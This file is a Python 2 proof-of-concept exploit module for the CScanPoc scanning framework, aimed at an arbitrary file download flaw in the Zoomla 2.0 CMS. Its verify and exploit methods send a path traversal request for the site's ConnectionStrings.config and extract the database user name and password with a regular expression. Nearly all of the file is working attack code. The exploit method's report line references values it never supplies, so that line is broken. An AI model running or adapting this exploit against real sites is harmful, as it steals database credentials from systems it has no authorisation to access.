# coding: utf-8
import re
import urllib
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zoomla_0101'  # 平台漏洞编号，留空
    name = 'Zoomla 2.0 /User/UserZone/School/Download.aspx 任意文件下载'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-10-17'  # 漏洞公布时间
    desc = '''
    Zoomla X2.0 has Arbitary File Download in /User/UserZone/School/Download.aspx.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zoomla'  # 漏洞应用名称
    product_version = '2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6215961d-834e-414b-ac79-93d88fa6e5c8'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            username = ""
            password = ""
            payload = "/User/UserZone/School/Download.aspx?f=..\\..\\..\\Config\\ConnectionStrings.config"
            verify_url = self.target + payload
            response = urllib2.urlopen(verify_url)

            html = response.read().decode('utf-8')
            data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
            username = data[0][0]
            password = data[0][1]
            if username and password:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            username = ""
            password = ""
            payload = "/User/UserZone/School/Download.aspx?f=..\\..\\..\\Config\\ConnectionStrings.config"
            verify_url = self.target + payload
            response = urllib2.urlopen(verify_url)

            html = response.read().decode('utf-8')
            data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
            username = data[0][0]
            password = data[0][1]
            if username and password:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息:username={username},password={password}'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
